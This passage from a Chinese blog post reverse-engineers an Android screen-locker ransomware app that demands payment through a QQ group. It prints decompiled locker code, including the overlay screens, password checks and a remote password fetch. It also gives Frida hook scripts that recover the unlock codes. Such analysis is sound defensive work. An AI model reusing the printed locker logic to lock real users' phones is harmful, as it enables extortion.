class="line"></span><br><span class="line">第三个参数是一些附加参数，常用有：</span><br><span class="line">FLAG_PLAY_SOUND 调整音量时播放声音  </span><br><span class="line">FLAG_SHOW_UI 调整时显示音量条,就是按音量键出现的那个  </span><br><span class="line">0 表示什么也没有  </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;现在只需要hook android.media.AudioManager的setStreamVolume</span><br><span class="line">&#x2F;&#x2F;将此函数中的第二个参数置0即可</span><br><span class="line">&#x2F;&#x2F;hook 代码如下：</span><br><span class="line">function hook_audio()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;Inside java perform&quot;);</span><br><span class="line">        Java.use(&quot;android.media.AudioManager&quot;).setStreamVolume.implementation &#x3D; function(int1,int2,int3)&#123;</span><br><span class="line">            var res &#x3D; this.setStreamVolume(int1,0,int3);</span><br><span class="line">            return res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><p>hook Called <code>com.shimeng.qq2693533893.MyServiceOne</code>后进行点击操作</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.颜如玉(java.lang.String)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.SHA1(java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.getOrderByLexicographic(java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.getParamsName(java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.lexicographicOrder(java.util.List)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.splitParams(java.util.List, java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.颜如玉(java.lang.String)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.SHA1(java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.getOrderByLexicographic(java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.getParamsName(java.util.Map)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.lexicographicOrder(java.util.List)</span><br><span class="line">(agent) [59xlexa5rds] Called com.shimeng.qq2693533893.MyServiceOne.splitParams(java.util.List, java.util.Map)</span><br></pre></td></tr></table></figure><p>根据调用栈来分析对应函数,使用objection来hook <code>com.shimeng.qq2693533893.MyServiceOne.颜如玉</code> 函数，发现调用<code>com.shimeng.qq2693533893.MyServiceOne$100000002.onClick(MyServiceOne.java:192)</code> 函数，并打印出了对应的返回值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.shimeng.qq2693533893 on (Android: 6.0.1) [usb] # android hooking watch class_method com.shimeng.qq2693533893.MyServiceOne.颜如玉 --dump-args --dump-backtrace --dump-return</span><br><span class="line">(agent) Attempting to watch class com.shimeng.qq2693533893.MyServiceOne and method 颜如玉.</span><br><span class="line">(agent) Hooking com.shimeng.qq2693533893.MyServiceOne.颜如玉(java.lang.String)</span><br><span class="line">(agent) Registering job same6urlidq. Type: watch-method for: com.shimeng.qq2693533893.MyServiceOne.颜如玉</span><br><span class="line">com.shimeng.qq2693533893 on (Android: 6.0.1) [usb] # (agent) [same6urlidq] Called com.shimeng.qq2693533893.MyServiceOne.颜如玉(java.lang.String)</span><br><span class="line">(agent) [same6urlidq] Backtrace:</span><br><span class="line">com.shimeng.qq2693533893.MyServiceOne.颜如玉(Native Method)</span><br><span class="line">        com.shimeng.qq2693533893.MyServiceOne$100000002.onClick(MyServiceOne.java:186)</span><br><span class="line">android.view.View.performClick(View.java:5204)</span><br><span class="line">android.view.View$PerformClick.run(View.java:21153)</span><br><span class="line">android.os.Handler.handleCallback(Handler.java:739)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:95)</span><br><span class="line">android.os.Looper.loop(Looper.java:148)</span><br><span class="line">android.app.ActivityThread.main(ActivityThread.java:5647)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:745)</span><br><span class="line">com.android.internal.os.ZygoteInit.main(ZygoteInit.java:635)</span><br><span class="line"></span><br><span class="line">(agent) [same6urlidq] Arguments com.shimeng.qq2693533893.MyServiceOne.颜如玉(BDAFF3D900183B306F259885D923DF1C)</span><br><span class="line">(agent) [same6urlidq] Return Value: 5948146256E1A341A6486442397EE2C2FB1A832E</span><br><span class="line">(agent) [same6urlidq] Called com.shimeng.qq2693533893.MyServiceOne.颜如玉(java.lang.String)</span><br><span class="line">(agent) [same6urlidq] Backtrace:</span><br><span class="line">com.shimeng.qq2693533893.MyServiceOne.颜如玉(Native Method)</span><br><span class="line">com.shimeng.qq2693533893.MyServiceOne$100000002.onClick(MyServiceOne.java:192)</span><br><span class="line">android.view.View.performClick(View.java:5204)</span><br><span class="line">android.view.View$PerformClick.run(View.java:21153)</span><br><span class="line">android.os.Handler.handleCallback(Handler.java:739)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:95)</span><br><span class="line">android.os.Looper.loop(Looper.java:148)</span><br><span class="line">android.app.ActivityThread.main(ActivityThread.java:5647)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:745)</span><br><span class="line">com.android.internal.os.ZygoteInit.main(ZygoteInit.java:635)</span><br><span class="line"></span><br><span class="line">(agent) [same6urlidq] Arguments com.shimeng.qq2693533893.MyServiceOne.颜如玉(123)</span><br><span class="line">(agent) [same6urlidq] Return Value: 84073A4AF62DB3D30C4BF2B31622CC0EB1FA9E70</span><br></pre></td></tr></table></figure><p>定位到该函数。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    100000002(EditText arg16, int arg17, TextView arg18, Button arg19, TextView arg20, TextView arg21, TextView arg22, TextView arg23, TextView arg24) &#123;</span><br><span class="line">        this.val$editText &#x3D; arg16;</span><br><span class="line">        this.val$诗梦 &#x3D; arg17;</span><br><span class="line">        this.val$lpo &#x3D; arg18;</span><br><span class="line">        this.val$button &#x3D; arg19;</span><br><span class="line">        this.val$textView2 &#x3D; arg20;</span><br><span class="line">        this.val$a00 &#x3D; arg21;</span><br><span class="line">        this.val$b00 &#x3D; arg22;</span><br><span class="line">        this.val$c00 &#x3D; arg23;</span><br><span class="line">        this.val$d00 &#x3D; arg24;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static MyServiceOne access$0(100000002 arg4) &#123;</span><br><span class="line">        return MyServiceOne.this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override  &#x2F;&#x2F; android.view.View$OnClickListener</span><br><span class="line">    public void onClick(View arg15) &#123;</span><br><span class="line">        String v2 &#x3D; this.val$editText.getText().toString();</span><br><span class="line">        if(v2.length() &gt;&#x3D; 3) &#123;</span><br><span class="line">            String v3 &#x3D; MyServiceOne.颜如玉(颜如玉QQ2693533893.getSaltMD5(&quot;&quot; + this.val$诗梦)).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line">            if(v3.length() &gt; 9 &amp;&amp; v3.length() &gt; 3) &#123;</span><br><span class="line">                if(颜如玉QQ2693533893.getSaltMD5(MyServiceOne.颜如玉(v2.substring(0, 3))) + v2.substring(3, v2.length()).equals(&quot;9DDEB743E935CE399F1DFAF080775366&quot; + v3.substring(0, 9))) &#123;</span><br><span class="line">                    MyServiceOne.this.util.removeView();</span><br><span class="line">                    MyServiceOne.this.sm2();</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                --MyServiceOne.this.L;</span><br><span class="line">                ++MyServiceOne.this.B;</span><br><span class="line">                this.val$lpo.setText(&quot;很抱歉！密码错误解锁请加QQ群:437732815联系管理员购买正确的密码解锁...密码以错&quot; + MyServiceOne.this.B + &quot;次！&quot; + &quot;还剩&quot; + MyServiceOne.this.L + &quot;次输入错误密码的机会&quot;);</span><br><span class="line">                if(MyServiceOne.this.L &lt;&#x3D; 0) &#123;</span><br><span class="line">                    this.val$lpo.setText(&quot;本次输入密码错误次数累计以达10次,请重启手机后获取输入密码机会！&quot;);</span><br><span class="line">                    this.val$button.setVisibility(8);</span><br><span class="line">                    this.val$textView2.setVisibility(8);</span><br><span class="line">                    this.val$editText.setVisibility(8);</span><br><span class="line">                    this.val$a00.setVisibility(8);</span><br><span class="line">                    this.val$b00.setVisibility(8);</span><br><span class="line">                    this.val$c00.setVisibility(8);</span><br><span class="line">                    this.val$d00.setVisibility(8);</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到重要逻辑部分在此处。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String v3 &#x3D; MyServiceOne.颜如玉(颜如玉QQ2693533893.getSaltMD5(&quot;&quot; + this.val$诗梦)).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">if(颜如玉QQ2693533893.getSaltMD5(MyServiceOne.颜如玉(v2.substring(0, 3))) + v2.substring(3, v2.length()).equals(&quot;9DDEB743E935CE399F1DFAF080775366&quot; + v3.substring(0, 9))) &#123;</span><br><span class="line">                        MyServiceOne.this.util.removeView();</span><br><span class="line">                        MyServiceOne.this.sm2();</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><p>发现主要的判断逻辑如下，如果与<code>9DDEB743E935CE399F1DFAF080775366</code>相等,则移除<code>MyServiceOne.this.util.removeView()</code>,进入<code>sm2</code>。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129102441093.png" alt="image-20230129102441093"></p><p>在sm处获取对应的识别码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void sm() &#123;</span><br><span class="line">    this.util &#x3D; new FloatViewUtil(this);</span><br><span class="line">    this.v &#x3D; LayoutInflater.from(this).inflate(0x7F030002, null);  &#x2F;&#x2F; layout:MT_Bin</span><br><span class="line">    this.util.setview(this.v);</span><br><span class="line">    this.util.createfloatview(-1, 0x500);</span><br><span class="line">    Button v3 &#x3D; (Button)this.util.byid(0x7F07000B);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v4 &#x3D; (TextView)this.util.byid(0x7F070008);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    EditText v5 &#x3D; (EditText)this.util.byid(0x7F07000A);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v6 &#x3D; (TextView)this.util.byid(0x7F07000F);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v7 &#x3D; (TextView)this.util.byid(0x7F070007);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v8 &#x3D; (TextView)this.util.byid(0x7F070009);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v9 &#x3D; (TextView)this.util.byid(0x7F07000C);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v10 &#x3D; (TextView)this.util.byid(0x7F07000D);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    int v11 &#x3D; (int)(Math.random() * 4.879400E-320);</span><br><span class="line">    v4.setText(&quot;你的识别码&#x3D;&quot; + 颜如玉QQ2693533893.get(&quot;&quot; + v11));</span><br><span class="line">    颜如玉QQ2693533893.te(&quot;sdcard&quot;);</span><br><span class="line">    USBLock v13 &#x3D; new USBLock();</span><br><span class="line">    new Timer().schedule(v13, new Date(), 1000L);</span><br><span class="line">    v3.setOnClickListener(new 100000002(this, v5, v11 ^ 0x508, v6, v3, v4, v7, v8, v9, v10));</span><br></pre></td></tr></table></figure><p><code>.get</code>方法如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String get(String arg13) &#123;</span><br><span class="line">    byte[] v1 &#x3D; arg13.getBytes();</span><br><span class="line">    StringBuilder v2 &#x3D; new StringBuilder(v1.length * 2);</span><br><span class="line">    int v3;</span><br><span class="line">    for(v3 &#x3D; 0; v3 &lt; v1.length; ++v3) &#123;</span><br><span class="line">        v2.append(((char)颜如玉QQ2693533893.hexString.charAt((v1[v3] &amp; 15) &gt;&gt; 0)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String v3_1 &#x3D; &quot;&quot;;</span><br><span class="line">    String[] v4 &#x3D; &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;&#125;;</span><br><span class="line">    String[] v5 &#x3D; &#123;&quot;嘻&quot;, &quot;❥&quot;, &quot;÷&quot;, &quot;∷&quot;, &quot;●&quot;, &quot;©&quot;, &quot;额&quot;, &quot;★&quot;, &quot;※&quot;, &quot;&#x2F;&quot;&#125;;</span><br><span class="line">    int v6;</span><br><span class="line">    for(v6 &#x3D; 0; v6 &lt; 10; ++v6) &#123;</span><br><span class="line">        if(v6 &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            v3_1 &#x3D; v2.toString().replace(v4[v6], v5[v6]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v3_1 &#x3D; v3_1.replace(v4[v6], v5[v6]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return v3_1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在sm()方法中拿到生成识别码的逻辑，跟进去原来是随机四位数做了火星文对应，在100000002构造函数中<code>this.val$诗梦 = arg17;</code>就是随机四位数v11 ^ 1288，，所以才显示在前台页面是火星文，那么我们可以<strong>通过hook颜如玉QQ2693533893.get()拿到四位数对应的该火星文</strong>，也可以直接根据V4 V5对应表来找到该火星文。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int v11 &#x3D; (int)(Math.random() * 4.879400E-320);</span><br><span class="line">v4.setText(&quot;你的识别码&#x3D;&quot; + 颜如玉QQ2693533893.get(&quot;&quot; + v11));</span><br><span class="line">颜如玉QQ2693533893.te(&quot;sdcard&quot;);</span><br><span class="line">USBLock v13 &#x3D; new USBLock();</span><br><span class="line">new Timer().schedule(v13, new Date(), 1000L);</span><br><span class="line">v3.setOnClickListener(new 100000002(this, v5, v11 ^ 0x508, v6, v3, v4, v7, v8, v9, v10));</span><br></pre></td></tr></table></figure><p>可以根据get方法中对应的信息进行定位。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129103815123.png" alt="image-20230129103815123" div align="center"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String[] v4 &#x3D; &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;&#125;;</span><br><span class="line">String[] v5 &#x3D; &#123;&quot;嘻&quot;, &quot;❥&quot;, &quot;÷&quot;, &quot;∷&quot;, &quot;●&quot;, &quot;©&quot;, &quot;额&quot;, &quot;★&quot;, &quot;※&quot;, &quot;&#x2F;&quot;&#125;;</span><br><span class="line">6190</span><br></pre></td></tr></table></figure><p>接着分析onClick方法可知随机四位数被作为参数给了getSaltMD5,那么我们可以<strong>通过反射和四位数拿到v3的值。</strong></p><p>hook.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Find_Code()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var javaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line"></span><br><span class="line">        for(var i&#x3D;999;i&lt;10000;i++)&#123;</span><br><span class="line">            var i &#x3D; javaString.$new(String(i));</span><br><span class="line">            var Code &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).get(i);</span><br><span class="line">            var v3 &#x3D; Java.use(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;).颜如玉(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).getSaltMD5((javaString.$new(String(i^1288)))));</span><br><span class="line">            var v3 &#x3D; javaString.$new(final_last9).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">            console.log(&quot;i,Code,v3:&quot;,i,Code,v3);</span><br><span class="line">            if (Code &#x3D;&#x3D; &quot;额❥&#x2F;嘻&quot;)&#123; &#x2F;&#x2F; 5147</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i,Code,v3: 6179 额❥★&#x2F; 5930115214632905764947</span><br><span class="line">i,Code,v3: 6180 额❥※嘻 107899719181495393421953265</span><br><span class="line">i,Code,v3: 6181 额❥※❥ 637925064710567273601450494</span><br><span class="line">i,Code,v3: 6182 额❥※÷ 79031009396005431455865545</span><br><span class="line">i,Code,v3: 6183 额❥※∷ 927545851918403937793285270</span><br><span class="line">i,Code,v3: 6184 额❥※● 1520178882327296987108</span><br><span class="line">i,Code,v3: 6185 额❥※© 37660404572152154889</span><br><span class="line">i,Code,v3: 6186 额❥※额 5153164879398001979082044</span><br><span class="line">i,Code,v3: 6187 额❥※★ 7549072384256789855633</span><br><span class="line">i,Code,v3: 6188 额❥※※ 04993536950983416668988739</span><br><span class="line">i,Code,v3: 6189 额❥※&#x2F; 4503222936237929487161634306</span><br><span class="line">i,Code,v3: 6190 额❥&#x2F;嘻 91852619857657324187556049</span><br></pre></td></tr></table></figure><p>接着我们分析判断的语句。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">颜如玉QQ2693533893.getSaltMD5(MyServiceOne.颜如玉(v2.substring(0, 3))) + v2.substring(3, v2.length()).equals(&quot;9DDEB743E935CE399F1DFAF080775366&quot; + v3.substring(0, 9))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;step1</span><br><span class="line">getSaltMD5(MyServiceOne.颜如玉(v2.substring(0, 3))) + v2.substring(3, v2.length()) &#x3D;</span><br><span class="line">&quot;9DDEB743E935CE399F1DFAF080775366&quot; + v3.substring(0, 9)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;step2</span><br><span class="line">getSaltMD5(MyServiceOne.颜如玉(v2.substring(0, 3))) &#x3D; &quot;9DDEB743E935CE399F1DFAF080775366&quot;</span><br><span class="line">v2.substring(3, v2.length()  &#x3D;  v3.substring(0, 9)</span><br></pre></td></tr></table></figure><p>hook1.js如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(var j&#x3D;1;j&lt;1000;j++)&#123;</span><br><span class="line">            var j &#x3D; javaString.$new(String(j));</span><br><span class="line">            var v2_3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).getSaltMD5(Java.use(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;).颜如玉(j));</span><br><span class="line">            &#x2F;&#x2F; console.log(&quot;l, v2_3:&quot;,j,v2_3);</span><br><span class="line">            if(v2_3 &#x3D;&#x3D; &#39;9DDEB743E935CE399F1DFAF080775366&#39;)&#123;</span><br><span class="line">            console.log(&quot;v2_3:&quot;,j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; v2_3: 358</span><br></pre></td></tr></table></figure><p>重新打开应用</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129111427733.png" alt="image-20230129111427733" div align="center"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Code 7363</span><br></pre></td></tr></table></figure><p>Hook1.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Find_Code()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var javaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">        for(var j&#x3D;1;j&lt;1000;j++)&#123;</span><br><span class="line">            var j &#x3D; javaString.$new(String(j));</span><br><span class="line">            var v2_3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).getSaltMD5(Java.use(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;).颜如玉(j));</span><br><span class="line">            &#x2F;&#x2F; console.log(&quot;l, v2_3:&quot;,j,v2_3);</span><br><span class="line">            if(v2_3 &#x3D;&#x3D; &#39;9DDEB743E935CE399F1DFAF080775366&#39;)&#123;</span><br><span class="line">                console.log(&quot;v2_3:&quot;,j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            var i &#x3D; javaString.$new(String(3744));</span><br><span class="line">            var Code &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).get(i);</span><br><span class="line">            var v3 &#x3D; Java.use(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;).颜如玉(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).getSaltMD5((javaString.$new(String(i^1288)))));</span><br><span class="line">            var v3 &#x3D; javaString.$new(v3).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line">            var resu1 &#x3D; &quot;358&quot; + javaString.$new(v3).substring(0, 9);</span><br><span class="line">            console.log(&quot;i,Code,v3,resu1:&quot;,i,Code, v3, resu1);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果为<strong>358230734399</strong>,输入进入第二层。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.shimeng.qq2693533893]-&gt; Find_Code()</span><br><span class="line">v2_3: 358</span><br><span class="line">i,Code,v3,resu1: 7363 ★∷额∷ 2307343997321858474745697 358230734399</span><br></pre></td></tr></table></figure><h3 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129123216805.png" alt="image-20230129123216805"></p><p>整体逻辑和第一层一样，首先来看sm2函数。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    this.util &#x3D; new FloatViewUtil(this);</span><br><span class="line">    this.v &#x3D; LayoutInflater.from(this).inflate(0x7F030001, null);  &#x2F;&#x2F; layout:MT_Bin</span><br><span class="line">    this.util.setview(this.v);</span><br><span class="line">    this.util.createfloatview(-1, 0x500);</span><br><span class="line">    Button v1 &#x3D; (Button)this.util.byid(0x7F070006);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v2 &#x3D; (TextView)this.util.byid(0x7F070004);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    EditText v3 &#x3D; (EditText)this.util.byid(0x7F070005);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    int v4 &#x3D; (int)(Math.random() * 4.940600E-319);</span><br><span class="line">    v2.setText(&quot;你的识别码&#x3D;&quot; + 颜如玉QQ2693533893.get(&quot;&quot; + v4));</span><br><span class="line">    v1.setOnClickListener(new 100000003(this, v3, v4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体逻辑和sm1一样不过识别码变成了5位，关键代码如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(v2.length() &gt;&#x3D; 3) &#123;</span><br><span class="line">                String v3 &#x3D; 颜如玉QQ2693533893.hex_sha1(MyServiceOne.破解死妈.getTwiceMD5ofString(&quot;&quot; + this.val$u2)).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line">                </span><br><span class="line">                if(v3.length() &gt; 9 &amp;&amp; v3.length() &gt; 3 &amp;&amp; (MyServiceOne.破解死妈.getTwiceMD5ofString(颜如玉QQ2693533893.hex_sha1(v2.substring(0, 3))) + v2.substring(3, v2.length()).equals(&quot;8D4FF507DCDA63C201EB8B99D4170900&quot; + v3.substring(0, 9)))) &#123;</span><br><span class="line">                    MyServiceOne.this.util.removeView();</span><br><span class="line">                    MyServiceOne.this.诗梦();</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>根据第一层的规则直接编写脚本如下</p><p>hook2.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Find_Code()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var javaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">        for(var j&#x3D;1;j&lt;1000;j++)&#123;</span><br><span class="line">            var j &#x3D; javaString.$new(String(j));</span><br><span class="line">            var v2_3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).$new().getTwiceMD5ofString(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).hex_sha1(j));</span><br><span class="line">            &#x2F;&#x2F;console.log(&quot;l, v2_3:&quot;,j,v2_3);</span><br><span class="line">            if(v2_3 &#x3D;&#x3D; &#39;8D4FF507DCDA63C201EB8B99D4170900&#39;)&#123;</span><br><span class="line">                console.log(&quot;v2_3:&quot;,j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        var i &#x3D; javaString.$new(String(44207));</span><br><span class="line">        var Code &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).get(i);</span><br><span class="line">        var v3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).hex_sha1(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).$new().getTwiceMD5ofString(i));</span><br><span class="line">        var v3 &#x3D; javaString.$new(v3).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line">        var resu2 &#x3D; &quot;694&quot; + javaString.$new(v3).substring(0, 9);</span><br><span class="line">        console.log(&quot;i,Code,v3,resu2&quot;,i,Code,v3,resu2)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.shimeng.qq2693533893]-&gt; Find_Code()</span><br><span class="line">v2_3: 694</span><br><span class="line">i,Code,v3,resu1 44207 ●●÷嘻★ 98869461037719278110486 694988694610</span><br></pre></td></tr></table></figure><h3 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129123346260.png" alt="image-20230129123346260"></p><p>看关键代码，主要逻辑是访问一个网站获取密码，然后与输入的内容进行对比。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void 诗梦() &#123;</span><br><span class="line">    this.util &#x3D; new FloatViewUtil(this);</span><br><span class="line">    this.v &#x3D; LayoutInflater.from(this).inflate(0x7F030000, null);  &#x2F;&#x2F; layout:MT_Bin</span><br><span class="line">    this.util.setview(this.v);</span><br><span class="line">    this.util.createfloatview(-1, 0x500);</span><br><span class="line">    Button v1 &#x3D; (Button)this.util.byid(0x7F070001);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    EditText v2 &#x3D; (EditText)this.util.byid(0x7F070000);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    this.解锁 &#x3D; (TextView)this.util.byid(0x7F070002);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    v1.setOnClickListener(new 100000006(this, v2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class 100000006 implements View.OnClickListener &#123;</span><br><span class="line">    class 100000004 implements Runnable &#123;</span><br><span class="line">        private final 100000006 this$0;</span><br><span class="line"></span><br><span class="line">        static 100000006 access$0(100000004 arg4) &#123;</span><br><span class="line">            return 100000006.this;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                String v1 &#x3D; 100000006.access$0(100000006.this).独自走在孤独的雨中(&quot;https:&#x2F;&#x2F;www.lanzous.com&#x2F;b819183&quot;);</span><br><span class="line">                100000006.access$0(100000006.this).坐等前往世界的尽头的小船 &#x3D; v1.substring(v1.indexOf(&quot;【&quot;), v1.indexOf(&quot;】&quot;)).replace(&quot;【&quot;, &quot;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch(Exception v3) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        public void onClick(View arg12) &#123;</span><br><span class="line">        new Thread(new 100000004(this)).start();</span><br><span class="line">        if(&quot;187724addd757b99a9dc1eb570c65f32c33f5941&quot;.equals(MyServiceOne.this.坐等前往世界的尽头的小船)) &#123;</span><br><span class="line">            MyServiceOne.this.util.removeView();</span><br><span class="line">            new Timer().schedule(new 100000005(this), 1500L);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        